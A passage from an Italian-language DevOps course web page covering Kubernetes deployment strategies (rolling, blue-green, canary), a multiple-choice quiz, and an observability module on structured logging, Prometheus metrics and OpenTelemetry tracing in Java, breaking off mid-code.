                    </thead>
                    <tbody>
                        <tr>
                            <td>Hosting</td>
                            <td>SaaS (managed by GitHub)</td>
                            <td>Self-hosted o managed</td>
                        </tr>
                        <tr>
                            <td>Configurazione</td>
                            <td>YAML in <code>.github/workflows/</code></td>
                            <td>Jenkinsfile (Groovy)</td>
                        </tr>
                        <tr>
                            <td>Curva di apprendimento</td>
                            <td>Bassa</td>
                            <td>Alta (ma più flessibile)</td>
                        </tr>
                        <tr>
                            <td>Marketplace/Plugin</td>
                            <td>GitHub Marketplace (Actions)</td>
                            <td>Vastissimo ecosistema plugin</td>
                        </tr>
                        <tr>
                            <td>Ideale per</td>
                            <td>Progetti su GitHub, team piccoli-medi</td>
                            <td>Enterprise, requisiti complessi</td>
                        </tr>
                    </tbody>
                </table>
            </section>

            <!-- Deployment Strategies Section -->
            <section class="section" id="modulo5-deployment">
                <h2>Deployment Strategies</h2>

                <p>La scelta della strategia di deployment impatta direttamente su <strong>downtime</strong>, <strong>rischio</strong> e <strong>velocità di rollback</strong>. Vediamo le strategie più comuni.</p>

                <h3>Rolling Update</h3>

                <p>Il <strong>Rolling Update</strong> è la strategia di default in Kubernetes. I Pod vengono aggiornati gradualmente, sostituendo le vecchie istanze con le nuove una alla volta.</p>

                <div class="diagram">
<pre>
              ROLLING UPDATE PROGRESSION

Time 0:   [v1] [v1] [v1] [v1]     ← 4 Pod versione 1

Time 1:   [v1] [v1] [v1] [v2]     ← 1 nuovo Pod v2 creato

Time 2:   [v1] [v1] [v2] [v2]     ← Gradualmente sostituiti

Time 3:   [v1] [v2] [v2] [v2]

Time 4:   [v2] [v2] [v2] [v2]     ← Tutti i Pod aggiornati

✅ Pro: Zero downtime, uso efficiente delle risorse
❌ Contro: Rollback lento, due versioni coesistono temporaneamente
</pre>
                </div>

                <pre><code class="language-yaml"># Rolling Update in Kubernetes
spec:
  strategy:
    type: RollingUpdate
    rollingUpdate:
      maxSurge: 25%        # Max Pod extra durante update
      maxUnavailable: 25%  # Max Pod non disponibili</code></pre>

                <h3>Blue-Green Deployment</h3>

                <p>Nel <strong>Blue-Green Deployment</strong> mantieni due ambienti identici: Blue (produzione attuale) e Green (nuova versione). Il traffico viene switchato istantaneamente tramite load balancer.</p>

                <div class="diagram">
<pre>
              BLUE-GREEN DEPLOYMENT

┌─────────────────────────────────────────────────────┐
│                  LOAD BALANCER                       │
│                       │                              │
│         ┌─────────────┴─────────────┐               │
│         │                           │               │
│         ▼                           ▼               │
│  ┌─────────────┐            ┌─────────────┐        │
│  │    BLUE     │            │    GREEN    │        │
│  │   (v1.0)    │            │   (v1.1)    │        │
│  │  [ACTIVE]   │            │  [STANDBY]  │        │
│  │             │            │             │        │
│  │ [Pod] [Pod] │            │ [Pod] [Pod] │        │
│  └─────────────┘            └─────────────┘        │
└─────────────────────────────────────────────────────┘

                    AFTER SWITCH

                  LOAD BALANCER
                       │
         ┌─────────────┴─────────────┐
         │                           │
         ▼                           ▼
  ┌─────────────┐            ┌─────────────┐
  │    BLUE     │            │    GREEN    │
  │   (v1.0)    │            │   (v1.1)    │
  │  [STANDBY]  │            │  [ACTIVE]   │ ← Traffic
  └─────────────┘            └─────────────┘

✅ Pro: Rollback istantaneo, zero downtime
❌ Contro: Richiede il doppio delle risorse
</pre>
                </div>

                <pre><code class="language-yaml"># Blue-Green con Kubernetes Services
# Service che punta all'ambiente attivo
apiVersion: v1
kind: Service
metadata:
  name: my-app-production
spec:
  selector:
    app: my-app
    version: green    # Switch: cambia da "blue" a "green"
  ports:
    - port: 80
      targetPort: 8080

---
# Deployment Blue
apiVersion: apps/v1
kind: Deployment
metadata:
  name: my-app-blue
spec:
  replicas: 3
  selector:
    matchLabels:
      app: my-app
      version: blue
  template:
    metadata:
      labels:
        app: my-app
        version: blue
    spec:
      containers:
        - name: app
          image: my-app:1.0.0

---
# Deployment Green
apiVersion: apps/v1
kind: Deployment
metadata:
  name: my-app-green
spec:
  replicas: 3
  selector:
    matchLabels:
      app: my-app
      version: green
  template:
    metadata:
      labels:
        app: my-app
        version: green
    spec:
      containers:
        - name: app
          image: my-app:1.1.0</code></pre>

                <h3>Canary Deployment</h3>

                <p>Il <strong>Canary Deployment</strong> rilascia la nuova versione a un piccolo subset di utenti (es. 5%) prima di procedere con il rollout completo. Permette di validare la nuova versione in produzione con rischio limitato.</p>

                <div class="diagram">
<pre>
              CANARY DEPLOYMENT PROGRESSION

Phase 1: Initial Canary (5% traffic)
┌────────────────────────────────────────┐
│            INGRESS CONTROLLER          │
│                   │                    │
│         95%       │        5%          │
│           ┌───────┴───────┐            │
│           ▼               ▼            │
│    ┌───────────┐   ┌───────────┐       │
│    │  STABLE   │   │  CANARY   │       │
│    │   v1.0    │   │   v1.1    │       │
│    │ 10 Pods   │   │  1 Pod    │       │
│    └───────────┘   └───────────┘       │
└────────────────────────────────────────┘

Phase 2: Gradual Increase (25% traffic)
         75%               25%

Phase 3: Full Rollout (100% traffic)
          0%               100%

✅ Pro: Rischio minimizzato, validazione in produzione reale
❌ Contro: Complessità di routing, monitoring rigoroso necessario
</pre>
                </div>

                <pre><code class="language-yaml"># Canary con Argo Rollouts
apiVersion: argoproj.io/v1alpha1
kind: Rollout
metadata:
  name: my-app
spec:
  replicas: 10
  selector:
    matchLabels:
      app: my-app
  template:
    metadata:
      labels:
        app: my-app
    spec:
      containers:
        - name: app
          image: my-app:1.1.0
  strategy:
    canary:
      steps:
        - setWeight: 5        # 5% traffico al canary
        - pause: {duration: 5m}
        - setWeight: 25       # 25% traffico
        - pause: {duration: 10m}
        - setWeight: 50       # 50% traffico
        - pause: {duration: 10m}
        # Analisi automatica delle metriche
        - analysis:
            templates:
              - templateName: success-rate
            args:
              - name: service-name
                value: my-app
      # Rollback automatico se l'analisi fallisce
      analysis:
        successfulRunHistoryLimit: 3
        unsuccessfulRunHistoryLimit: 3

---
# Template di analisi per Canary
apiVersion: argoproj.io/v1alpha1
kind: AnalysisTemplate
metadata:
  name: success-rate
spec:
  args:
    - name: service-name
  metrics:
    - name: success-rate
      interval: 1m
      successCondition: result[0] >= 0.95  # 95% success rate
      provider:
        prometheus:
          address: http://prometheus:9090
          query: |
            sum(rate(http_requests_total{service="{{args.service-name}}",status=~"2.."}[5m])) /
            sum(rate(http_requests_total{service="{{args.service-name}}"}[5m]))</code></pre>

                <h3>Confronto Strategie di Deployment</h3>

                <table>
                    <thead>
                        <tr>
                            <th>Strategia</th>
                            <th>Downtime</th>
                            <th>Rischio</th>
                            <th>Rollback</th>
                            <th>Risorse</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><strong>Recreate</strong></td>
                            <td>Sì (breve)</td>
                            <td>Alto</td>
                            <td>Lento</td>
                            <td>Normali</td>
                        </tr>
                        <tr>
                            <td><strong>Rolling Update</strong></td>
                            <td>No</td>
                            <td>Medio</td>
                            <td>Medio</td>
                            <td>Normali + surge</td>
                        </tr>
                        <tr>
                            <td><strong>Blue-Green</strong></td>
                            <td>No</td>
                            <td>Basso</td>
                            <td>Istantaneo</td>
                            <td>2x</td>
                        </tr>
                        <tr>
                            <td><strong>Canary</strong></td>
                            <td>No</td>
                            <td>Molto basso</td>
                            <td>Istantaneo</td>
                            <td>Normali + canary</td>
                        </tr>
                    </tbody>
                </table>

                <div class="info-box success">
                    <h4>Best Practice: Feature Flags + Canary</h4>
                    <p>Combina <strong>Feature Flags</strong> con <strong>Canary Deployment</strong> per il massimo controllo. Puoi deployare codice con feature disabilitate, poi abilitarle gradualmente indipendentemente dal deployment. Strumenti: LaunchDarkly, Unleash, Flagsmith.</p>
                </div>
            </section>

            <!-- Quiz Modulo 5 -->
            <section class="quiz-section" id="modulo5-quiz">
                <h2>Interactive Challenge Quiz - Modulo 5</h2>
                <p>Testa la tua comprensione di Docker, Kubernetes e strategie di deployment.</p>

                <!-- Question 21 -->
                <div class="quiz-question" data-correct="c">
                    <h4><span>Q1.</span> Un Dockerfile ha questo ordine di istruzioni: <code>COPY . .</code>, poi <code>RUN npm install</code>, poi <code>RUN npm build</code>. Cosa succede quando modifichi solo un file TypeScript e rebuildi?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q21" id="q21a" value="a">
                            <label for="q21a">Solo <code>npm build</code> viene rieseguito, le dipendenze sono cached</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q21" id="q21b" value="b">
                            <label for="q21b">Docker usa il layer cache e non riesegue nulla</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q21" id="q21c" value="c">
                            <label for="q21c">Sia <code>npm install</code> che <code>npm build</code> vengono rieseguiti</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q21" id="q21d" value="d">
                            <label for="q21d">Solo <code>COPY</code> viene rieseguito, i RUN sono sempre cached</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q21')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q21"></div>
                </div>

                <!-- Question 22 -->
                <div class="quiz-question" data-correct="b">
                    <h4><span>Q2.</span> In Kubernetes, un Pod ha <code>readinessProbe</code> che fallisce ma <code>livenessProbe</code> che passa. Cosa succede?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q22" id="q22a" value="a">
                            <label for="q22a">Il Pod viene riavviato perché non è "ready"</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q22" id="q22b" value="b">
                            <label for="q22b">Il Pod continua a girare ma viene rimosso dagli endpoint del Service</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q22" id="q22c" value="c">
                            <label for="q22c">Il Pod viene terminato e ricreato dal Deployment</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q22" id="q22d" value="d">
                            <label for="q22d">Nulla, readinessProbe è solo informativa</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q22')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q22"></div>
                </div>

                <!-- Question 23 -->
                <div class="quiz-question" data-correct="d">
                    <h4><span>Q3.</span> Stai configurando un Horizontal Pod Autoscaler (HPA) basato su CPU. I Pod hanno <code>requests.cpu: 200m</code> e <code>limits.cpu: 500m</code>. L'HPA è configurato per scalare quando la CPU supera il 70%. A quale utilizzo effettivo scatta lo scaling?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q23" id="q23a" value="a">
                            <label for="q23a">350m (70% di 500m limits)</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q23" id="q23b" value="b">
                            <label for="q23b">Quando il nodo raggiunge il 70% di CPU</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q23" id="q23c" value="c">
                            <label for="q23c">Non è possibile determinarlo senza conoscere le metriche attuali</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q23" id="q23d" value="d">
                            <label for="q23d">140m (70% di 200m requests)</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q23')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q23"></div>
                </div>

                <!-- Question 24 -->
                <div class="quiz-question" data-correct="a">
                    <h4><span>Q4.</span> Durante un Canary deployment al 10%, noti che il tasso di errore del canary è del 5% mentre la versione stable ha 0.1%. Qual è l'azione corretta?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q24" id="q24a" value="a">
                            <label for="q24a">Rollback immediato: il canary ha 50x più errori della versione stable</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q24" id="q24b" value="b">
                            <label for="q24b">Continuare: 5% di errori è accettabile per un canary</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q24" id="q24c" value="c">
                            <label for="q24c">Aumentare il traffico al 25% per raccogliere più dati</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q24" id="q24d" value="d">
                            <label for="q24d">Ignorare: gli errori sono probabilmente transitori</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q24')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q24"></div>
                </div>

                <!-- Question 25 -->
                <div class="quiz-question" data-correct="c">
                    <h4><span>Q5.</span> In un Blue-Green deployment, dopo lo switch al Green, scopri un bug critico dopo 30 minuti. Come procedi?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q25" id="q25a" value="a">
                            <label for="q25a">Fix forward: correggi il bug e fai un nuovo deployment Green</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q25" id="q25b" value="b">
                            <label for="q25b">Rolling update per tornare gradualmente alla versione Blue</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q25" id="q25c" value="c">
                            <label for="q25c">Switch istantaneo del load balancer/service back to Blue</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q25" id="q25d" value="d">
                            <label for="q25d">Scale down Green a 0 replica e aspettare che Blue riceva tutto il traffico</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q25')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q25"></div>
                </div>
            </section>

            <!-- Links Modulo 5 -->
            <section class="section" id="modulo5-links">
                <h2>Link di Approfondimento - Modulo 5</h2>

                <div class="info-box">
                    <h4>Docker</h4>
                    <p><a href="https://docs.docker.com/" target="_blank">Docker Documentation</a></p>
                    <p><a href="https://docs.docker.com/develop/develop-images/dockerfile_best-practices/" target="_blank">Dockerfile Best Practices</a></p>
                    <p><a href="https://www.baeldung.com/dockerizing-spring-boot-application" target="_blank">Baeldung: Dockerizing Spring Boot</a></p>
                    <p><a href="https://github.com/GoogleContainerTools/jib" target="_blank">Google Jib</a> - Build container senza Dockerfile</p>
                </div>

                <div class="info-box">
                    <h4>Kubernetes</h4>
                    <p><a href="https://kubernetes.io/docs/home/" target="_blank">Kubernetes Documentation</a></p>
                    <p><a href="https://kubernetes.io/docs/tutorials/kubernetes-basics/" target="_blank">Kubernetes Basics Tutorial</a></p>
                    <p><a href="https://www.baeldung.com/kubernetes" target="_blank">Baeldung: Kubernetes Guide</a></p>
                    <p><a href="https://learnk8s.io/" target="_blank">LearnK8s</a> - Tutorials avanzati</p>
                    <p><a href="https://helm.sh/docs/" target="_blank">Helm Documentation</a> - Package manager K8s</p>
                </div>

                <div class="info-box">
                    <h4>CI/CD</h4>
                    <p><a href="https://docs.github.com/en/actions" target="_blank">GitHub Actions Documentation</a></p>
                    <p><a href="https://docs.gitlab.com/ee/ci/" target="_blank">GitLab CI/CD Documentation</a></p>
                    <p><a href="https://www.jenkins.io/doc/" target="_blank">Jenkins Documentation</a></p>
                    <p><a href="https://argoproj.github.io/argo-cd/" target="_blank">Argo CD</a> - GitOps for Kubernetes</p>
                </div>

                <div class="info-box">
                    <h4>Deployment Strategies</h4>
                    <p><a href="https://kubernetes.io/docs/concepts/workloads/controllers/deployment/#rolling-update-deployment" target="_blank">K8s: Rolling Updates</a></p>
                    <p><a href="https://martinfowler.com/bliki/BlueGreenDeployment.html" target="_blank">Martin Fowler: Blue-Green Deployment</a></p>
                    <p><a href="https://martinfowler.com/bliki/CanaryRelease.html" target="_blank">Martin Fowler: Canary Release</a></p>
                </div>
            </section>

            <!-- ==================== MODULO 6: ADVANCED TOPICS 2026 ==================== -->

            <header class="module-header" id="modulo6">
                <span class="module-tag">Modulo 6</span>
                <h1>Advanced Topics 2026</h1>
                <p>Observability, Infrastructure as Code e integrazione AI/LLM nelle applicazioni moderne</p>
            </header>

            <!-- Observability Section -->
            <section class="section" id="modulo6-observability">
                <h2>Observability: I Tre Pilastri</h2>

                <p>L'<strong>Observability</strong> è la capacità di comprendere lo stato interno di un sistema attraverso i suoi output esterni. A differenza del semplice monitoring (che risponde a "il sistema funziona?"), l'observability risponde a "perché il sistema si comporta così?".</p>

                <div class="info-box">
                    <h4>Monitoring vs Observability</h4>
                    <p>Il <strong>monitoring</strong> è reattivo: definisci metriche e alert in anticipo per problemi noti. L'<strong>observability</strong> è esplorativa: ti permette di investigare problemi sconosciuti attraverso dati correlati. In sistemi distribuiti complessi, non puoi prevedere tutti i possibili failure mode, quindi hai bisogno di observability.</p>
                </div>

                <h3>I Tre Pilastri dell'Observability</h3>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                        OBSERVABILITY STACK                                   │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│   ┌─────────────┐      ┌─────────────┐      ┌─────────────┐                │
│   │   LOGS      │      │   METRICS   │      │   TRACES    │                │
│   │             │      │             │      │             │                │
│   │  What       │      │  How much   │      │  Where      │                │
│   │  happened?  │      │  & how fast?│      │  & how long?│                │
│   └──────┬──────┘      └──────┬──────┘      └──────┬──────┘                │
│          │                    │                    │                        │
│          ▼                    ▼                    ▼                        │
│   ┌─────────────┐      ┌─────────────┐      ┌─────────────┐                │
│   │ Elasticsearch│      │ Prometheus  │      │   Jaeger    │                │
│   │ Loki        │      │ InfluxDB    │      │   Zipkin    │                │
│   │ Splunk      │      │ Datadog     │      │   Tempo     │                │
│   └─────────────┘      └─────────────┘      └─────────────┘                │
│                                                                              │
│                    ┌───────────────────────┐                                │
│                    │    OpenTelemetry      │                                │
│                    │  (Unified Collection) │                                │
│                    └───────────────────────┘                                │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <h3>1. Logging: Il "Cosa è Successo"</h3>

                <p>I <strong>log</strong> sono record immutabili di eventi discreti che si verificano nel sistema. Ogni log entry cattura un momento specifico nel tempo con contesto dettagliato.</p>

                <h4>Structured Logging vs Unstructured Logging</h4>

                <p>Il <strong>structured logging</strong> produce log in formato machine-readable (JSON), rendendo possibile l'analisi automatizzata e le query complesse. È essenziale per sistemi distribuiti dove devi correlare eventi tra servizi diversi.</p>

                <pre><code class="language-java">// ❌ Unstructured Logging - difficile da parsare e analizzare
log.info("User " + userId + " placed order " + orderId + " for $" + amount);

// ✅ Structured Logging con SLF4J + Logback/Log4j2
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.slf4j.MDC;

@Service
public class OrderService {
    private static final Logger log = LoggerFactory.getLogger(OrderService.class);

    public Order createOrder(String userId, OrderRequest request) {
        // MDC (Mapped Diagnostic Context) per contesto cross-cutting
        MDC.put("correlationId", UUID.randomUUID().toString());
        MDC.put("userId", userId);

        try {
            Order order = processOrder(request);

            // Structured logging con key-value pairs
            log.info("Order created successfully",
                kv("orderId", order.getId()),
                kv("amount", order.getTotalAmount()),
                kv("itemCount", order.getItems().size()),
                kv("paymentMethod", order.getPaymentMethod())
            );

            return order;
        } catch (InsufficientStockException e) {
            log.warn("Order creation failed due to stock",
                kv("orderId", request.getOrderId()),
                kv("failedItems", e.getFailedItems()),
                kv("reason", "insufficient_stock")
            );
            throw e;
        } finally {
            MDC.clear();
        }
    }
}</code></pre>

                <p>Il JSON risultante è facilmente indicizzabile e queryable:</p>

                <pre><code class="language-json">{
  "timestamp": "2026-01-28T10:15:30.123Z",
  "level": "INFO",
  "logger": "com.example.OrderService",
  "message": "Order created successfully",
  "correlationId": "abc-123-def-456",
  "userId": "user_789",
  "orderId": "ord_12345",
  "amount": 149.99,
  "itemCount": 3,
  "paymentMethod": "CREDIT_CARD",
  "service": "order-service",
  "environment": "production",
  "kubernetes": {
    "pod": "order-service-7d4b5c6-x2k9f",
    "namespace": "ecommerce"
  }
}</code></pre>

                <h4>Log Levels e Best Practices</h4>

                <table>
                    <thead>
                        <tr>
                            <th>Level</th>
                            <th>Quando Usare</th>
                            <th>Esempio</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><code>ERROR</code></td>
                            <td>Errori che richiedono intervento immediato</td>
                            <td>Database connection failed, Payment gateway timeout</td>
                        </tr>
                        <tr>
                            <td><code>WARN</code></td>
                            <td>Situazioni anomale ma gestite, degradazione</td>
                            <td>Retry succeeded, Cache miss rate high, Fallback activated</td>
                        </tr>
                        <tr>
                            <td><code>INFO</code></td>
                            <td>Eventi di business significativi</td>
                            <td>Order created, User registered, Payment processed</td>
                        </tr>
                        <tr>
                            <td><code>DEBUG</code></td>
                            <td>Dettagli utili per troubleshooting</td>
                            <td>Request/response payload, Cache hit, Query executed</td>
                        </tr>
                        <tr>
                            <td><code>TRACE</code></td>
                            <td>Dettagli molto granulari (raramente in prod)</td>
                            <td>Method entry/exit, Loop iterations</td>
                        </tr>
                    </tbody>
                </table>

                <h4>ELK Stack (Elasticsearch, Logstash, Kibana)</h4>

                <p>L'<strong>ELK Stack</strong> è la soluzione più diffusa per log aggregation e analysis:</p>

                <div class="diagram">
                    <pre>
┌──────────────┐     ┌──────────────┐     ┌──────────────┐     ┌──────────────┐
│   Services   │────▶│   Filebeat   │────▶│   Logstash   │────▶│Elasticsearch │
│   (Logs)     │     │   (Shipper)  │     │  (Transform) │     │   (Store)    │
└──────────────┘     └──────────────┘     └──────────────┘     └──────┬───────┘
                                                                       │
                                                                       ▼
                                                                ┌──────────────┐
                                                                │    Kibana    │
                                                                │ (Visualize)  │
                                                                └──────────────┘
                    </pre>
                </div>

                <ul>
                    <li><strong>Filebeat</strong>: Agent leggero che legge i log file e li invia a Logstash/Elasticsearch</li>
                    <li><strong>Logstash</strong>: Pipeline di processing per parsing, enrichment e transformation dei log</li>
                    <li><strong>Elasticsearch</strong>: Database distribuito ottimizzato per full-text search e analytics</li>
                    <li><strong>Kibana</strong>: UI per visualizzazione, dashboards e query dei log</li>
                </ul>

                <div class="info-box">
                    <h4>Alternativa: Grafana Loki</h4>
                    <p><strong>Loki</strong> è un'alternativa più leggera a Elasticsearch, sviluppata da Grafana Labs. A differenza di ELK che indicizza il contenuto completo dei log, Loki indicizza solo i metadati (labels) e comprime il testo dei log. Questo lo rende molto più economico in termini di storage e risorse, ideale per ambienti Kubernetes dove i log sono già etichettati con pod, namespace, etc.</p>
                </div>

                <h3>2. Metrics: Il "Quanto e Quanto Veloce"</h3>

                <p>Le <strong>metrics</strong> sono misurazioni numeriche aggregate nel tempo. A differenza dei log (eventi discreti), le metriche rappresentano valori che cambiano continuamente: CPU usage, request count, response time, error rate.</p>

                <h4>Tipi di Metriche</h4>

                <table>
                    <thead>
                        <tr>
                            <th>Tipo</th>
                            <th>Descrizione</th>
                            <th>Esempio</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><code>Counter</code></td>
                            <td>Valore che può solo aumentare (o reset a 0)</td>
                            <td>http_requests_total, errors_total</td>
                        </tr>
                        <tr>
                            <td><code>Gauge</code></td>
                            <td>Valore che può aumentare o diminuire</td>
                            <td>temperature, active_connections, queue_size</td>
                        </tr>
                        <tr>
                            <td><code>Histogram</code></td>
                            <td>Distribuzione di valori in bucket predefiniti</td>
                            <td>http_request_duration_seconds</td>
                        </tr>
                        <tr>
                            <td><code>Summary</code></td>
                            <td>Simile a Histogram ma calcola quantili client-side</td>
                            <td>request_latency (p50, p90, p99)</td>
                        </tr>
                    </tbody>
                </table>

                <h4>Prometheus e Spring Boot Actuator</h4>

                <pre><code class="language-java">// pom.xml dependencies
// spring-boot-starter-actuator
// micrometer-registry-prometheus

// application.yml
management:
  endpoints:
    web:
      exposure:
        include: health, metrics, prometheus
  metrics:
    tags:
      application: ${spring.application.name}
    distribution:
      percentiles-histogram:
        http.server.requests: true
      percentiles:
        http.server.requests: 0.5, 0.9, 0.95, 0.99</code></pre>

                <pre><code class="language-java">@Service
public class PaymentService {

    private final MeterRegistry meterRegistry;
    private final Counter paymentCounter;
    private final Timer paymentTimer;

    public PaymentService(MeterRegistry meterRegistry) {
        this.meterRegistry = meterRegistry;

        // Counter per contare i pagamenti per stato
        this.paymentCounter = Counter.builder("payments_total")
            .description("Total number of payment attempts")
            .tag("service", "payment-service")
            .register(meterRegistry);

        // Timer per misurare la latenza
        this.paymentTimer = Timer.builder("payment_processing_duration")
            .description("Time spent processing payments")
            .publishPercentiles(0.5, 0.95, 0.99)
            .register(meterRegistry);
    }

    public PaymentResult processPayment(PaymentRequest request) {
        return paymentTimer.record(() -> {
            try {
                PaymentResult result = gateway.charge(request);

                // Incrementa counter con tag dinamico
                meterRegistry.counter("payments_total",
                    "status", result.getStatus().name(),
                    "payment_method", request.getMethod().name()
                ).increment();

                return result;
            } catch (PaymentException e) {
                meterRegistry.counter("payments_total",
                    "status", "FAILED",
                    "error_type", e.getClass().getSimpleName()
                ).increment();
                throw e;
            }
        });
    }

    // Gauge per valori che cambiano
    @PostConstruct
    public void registerGauges() {
        Gauge.builder("payment_queue_size", paymentQueue, Queue::size)
            .description("Current size of payment processing queue")
            .register(meterRegistry);
    }
}</code></pre>

                <h4>PromQL: Querying Metrics</h4>

                <p><strong>PromQL</strong> è il linguaggio di query di Prometheus. Ecco alcune query comuni:</p>

                <pre><code class="language-yaml"># Request rate (richieste al secondo negli ultimi 5 minuti)
rate(http_requests_total[5m])

# Error rate percentuale
sum(rate(http_requests_total{status=~"5.."}[5m]))
/ sum(rate(http_requests_total[5m])) * 100

# 99th percentile latency
histogram_quantile(0.99,
  sum(rate(http_request_duration_seconds_bucket[5m])) by (le, service)
)

# Apdex score (Application Performance Index)
# Soddisfatti: < 300ms, Tolleranti: < 1.2s, Frustrati: > 1.2s
(
  sum(rate(http_request_duration_seconds_bucket{le="0.3"}[5m]))
  + sum(rate(http_request_duration_seconds_bucket{le="1.2"}[5m]))
) / 2 / sum(rate(http_request_duration_seconds_count[5m]))</code></pre>

                <h4>The Four Golden Signals (Google SRE)</h4>

                <p>Google SRE definisce quattro metriche fondamentali per monitorare qualsiasi servizio:</p>

                <table>
                    <thead>
                        <tr>
                            <th>Signal</th>
                            <th>Descrizione</th>
                            <th>Metrica Prometheus</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><strong>Latency</strong></td>
                            <td>Tempo per servire una richiesta</td>
                            <td><code>histogram_quantile(0.99, http_request_duration_seconds_bucket)</code></td>
                        </tr>
                        <tr>
                            <td><strong>Traffic</strong></td>
                            <td>Quante richieste stai ricevendo</td>
                            <td><code>rate(http_requests_total[5m])</code></td>
                        </tr>
                        <tr>
                            <td><strong>Errors</strong></td>
                            <td>Tasso di richieste fallite</td>
                            <td><code>rate(http_requests_total{status=~"5.."}[5m])</code></td>
                        </tr>
                        <tr>
                            <td><strong>Saturation</strong></td>
                            <td>Quanto è "pieno" il sistema</td>
                            <td><code>container_memory_usage_bytes / container_spec_memory_limit_bytes</code></td>
                        </tr>
                    </tbody>
                </table>

                <h3>3. Distributed Tracing: Il "Dove e Quanto Tempo"</h3>

                <p>In un sistema distribuito, una singola richiesta utente può attraversare decine di servizi. Il <strong>distributed tracing</strong> traccia il percorso completo di una richiesta attraverso tutti i servizi, permettendo di identificare colli di bottiglia e failure points.</p>

                <div class="diagram">
                    <pre>
Richiesta Utente: GET /api/orders/123
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Trace ID: abc-123-xyz
├── Span: API Gateway (12ms)
│   ├── Span: Auth Service - validate token (8ms)
│   │   └── Span: Redis - get session (2ms)
│   │
│   └── Span: Order Service - get order (45ms)
│       ├── Span: PostgreSQL - SELECT order (15ms)
│       │
│       ├── Span: User Service - get user details (18ms)  ← Chiamata HTTP
│       │   └── Span: PostgreSQL - SELECT user (5ms)
│       │
│       └── Span: Inventory Service - get stock (25ms)    ← Chiamata HTTP
│           └── Span: Redis - get stock cache (3ms)

Tempo Totale: 57ms (alcuni span sono paralleli)
                    </pre>
                </div>

                <h4>Concetti Fondamentali</h4>

                <ul>
                    <li><strong>Trace</strong>: Rappresenta il viaggio completo di una richiesta attraverso il sistema. Ha un ID unico.</li>
                    <li><strong>Span</strong>: Un singolo "pezzo" del trace, rappresenta un'operazione (chiamata HTTP, query DB, etc.). Ha ID, parent span ID, timing, tags.</li>
                    <li><strong>Context Propagation</strong>: Meccanismo per passare trace ID e span ID tra servizi (via HTTP headers o message metadata).</li>
                </ul>

                <h4>OpenTelemetry: Lo Standard Unificato</h4>

                <p><strong>OpenTelemetry</strong> (OTel) è lo standard CNCF che unifica la collezione di traces, metrics e logs. È il successore di OpenTracing e OpenCensus.</p>

                <pre><code class="language-java">// pom.xml - Spring Boot 3 con OpenTelemetry
// opentelemetry-spring-boot-starter
// opentelemetry-exporter-otlp

// application.yml
spring:
  application:
    name: order-service

otel:
  exporter:
    otlp:
      endpoint: http://otel-collector:4317
  resource:
    attributes:
      service.name: ${spring.application.name}
      deployment.environment: production
  instrumentation:
    spring-web:
      enabled: true
    jdbc:
      enabled: true</code></pre>

                <pre><code class="language-java">import io.opentelemetry.api.trace.Span;
import io.opentelemetry.api.trace.Tracer;
import io.opentelemetry.instrumentation.annotations.WithSpan;
import io.opentelemetry.instrumentation.annotations.SpanAttribute;

@Service
public class OrderService {

    private final Tracer tracer;

    public OrderService(Tracer tracer) {
        this.tracer = tracer;
    }

    // Auto-instrumentation con annotation
    @WithSpan("process-order")
    public Order processOrder(
            @SpanAttribute("order.id") String orderId,
            @SpanAttribute("user.id") String userId) {

        // Span automaticamente creato dalla annotation
        Span currentSpan = Span.current();

        // Aggiungere attributi dinamici
        currentSpan.setAttribute("order.total", calculateTotal());

        // Creare span figlio manualmente per operazioni custom
        Span inventorySpan = tracer.spanBuilder("check-inventory")
            .startSpan();

        try (var scope = inventorySpan.makeCurrent()) {
            inventorySpan.setAttribute("items.count", items.size());
            boolean available = checkInventory(items);
